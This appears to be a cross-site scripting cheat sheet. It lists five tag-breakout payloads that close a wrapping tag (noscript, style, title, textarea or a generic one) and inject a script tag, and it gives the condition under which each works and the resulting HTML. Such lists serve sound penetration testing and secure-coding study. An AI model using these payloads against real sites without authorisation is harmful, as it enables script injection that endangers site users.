1. XSS inside any Tag (General)
- Payload: </closing_tag><script>alert(1)</script>
- Condition: Input is reflected inside any HTML tag where angle brackets (< >) are NOT encoded
- Case: Angle brackets are not filtered so closing the wrapping tag allows injecting a new script tag. Replace closing_tag with the actual closing tag name that wraps the input (e.g. </script>, </noscript>, </style>, </title>, </textarea>, etc.)
- Output: <opening_tag></closing_tag><script>alert(1)</script></closing_tag>

---

2. XSS inside a Noscript Tag
- Payload: </noscript><script>alert(1)</script>
- Condition: Input is reflected inside a <noscript> tag where angle brackets (< >) are NOT encoded
- Case: Angle brackets are not filtered so closing the noscript tag allows injecting a new script tag
- Output: <noscript></noscript><script>alert(1)</script></noscript>

---

3. XSS inside a Style Tag
- Payload: </style><script>alert(1)</script>
- Condition: Input is reflected inside a <style> tag where angle brackets (< >) are NOT encoded
- Case: Angle brackets are not filtered so closing the style tag allows injecting a new script tag
- Output: <style></style><script>alert(1)</script></style>

---

4. XSS inside a Title Tag
- Payload: </title><script>alert(1)</script>
- Condition: Input is reflected inside a <title> tag where angle brackets (< >) are NOT encoded
- Case: Angle brackets are not filtered so closing the title tag allows injecting a new script tag
- Output: <title></title><script>alert(1)</script></title>

---

5. XSS inside a Textarea Tag
- Payload: </textarea><script>alert(1)</script>
- Condition: Input is reflected inside a <textarea> tag where angle brackets (< >) are NOT encoded
- Case: Angle brackets are not filtered so closing the textarea tag allows injecting a new script tag
- Output: <textarea></textarea><script>alert(1)</script></textarea>
